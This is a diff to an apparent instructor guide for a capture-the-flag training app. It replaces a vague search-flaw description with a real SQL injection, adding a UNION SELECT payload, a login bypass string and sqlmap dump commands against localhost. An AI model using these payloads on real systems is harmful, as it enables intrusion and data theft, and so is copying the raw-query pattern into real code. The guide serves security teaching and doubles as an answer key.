@@ -159,13 +159,27 @@
 ### Flag 13: `FLAG{sql_qu3ry_m4st3r}`
 - **Tier**: Hard | **Points**: 400
 - **Location**: `/api/v2/search?q=`
-- **How**: The search endpoint has injection-like behavior. Specific query patterns trigger error messages that leak database information.
-- **Exploit steps**:
-  1. Access `/api/v2/search?q=test` - normal search
-  2. Try `/api/v2/search?q='` - triggers error
-  3. The error message contains the flag and table information
-- **Teaches**: Error-based information disclosure, injection testing
-- **Hint for students**: "What happens when you break the search?"
+- **How**: The search endpoint has a REAL SQL injection vulnerability. The `q` parameter is directly interpolated into a raw SQL query via `$queryRawUnsafe`, allowing UNION-based and error-based SQL injection attacks.
+- **Exploit steps** (Error-based reconnaissance):
+  1. Access `/api/v2/search?q=test` - normal search results
+  2. Try `/api/v2/search?q='` - triggers SQL error revealing table names, columns, and database type
+  3. The error response leaks `debugInfo` including table list and column names
+- **Exploit steps** (UNION-based data extraction):
+  1. Use the error disclosure to learn the schema (11 columns in Artwork table)
+  2. Craft a UNION SELECT to extract data from HiddenLog: `/api/v2/search?q=' UNION SELECT id, eventType, message, metadata, '', 0, 0, '', 1, 1, 0 FROM HiddenLog--`
+  3. The response includes hidden log entries containing flag hints
+  4. When flag-related data is found in results, `FLAG{sql_qu3ry_m4st3r}` is also returned
+- **Exploit steps** (Login SQL injection - additional attack surface):
+  1. The login endpoint (`POST /api/auth/login`) also uses raw SQL with the username parameter
+  2. Auth bypass: `username = "curator_mike'--"` bypasses password verification
+  3. Error disclosure: malformed SQL on login returns table/column names
+- **sqlmap automation**:
+  ```bash
+  sqlmap -u 'http://localhost:3000/api/v2/search?q=test' --dbs
+  sqlmap -u 'http://localhost:3000/api/v2/search?q=test' -D main -T HiddenLog --dump
+  ```
+- **Teaches**: Real SQL injection exploitation (UNION-based, error-based, auth bypass), raw query dangers
+- **Hint for students**: "What happens when you break the search? Can you make it show data from other tables?"
 
 ### Flag 15: `FLAG{vh0st_3num3r4t10n_w1n}`
 - **Tier**: Hard | **Points**: 400
@@ -260,7 +274,8 @@
 │  /api/internal/stats → system info + logs       │
 │  /api/admin/users → no auth, all users          │
 │  /api/v1/export → data export without auth      │
-│  /api/v2/search → injection-like behavior       │
+│  /api/v2/search → REAL SQL injection (UNION)   │
+│  /api/auth/login → SQL injection auth bypass    │
 ├─────────────────────────────────────────────────┤
 │                BUSINESS LOGIC LEVEL              │
 │  PUT /api/users/profile → role IDOR             │
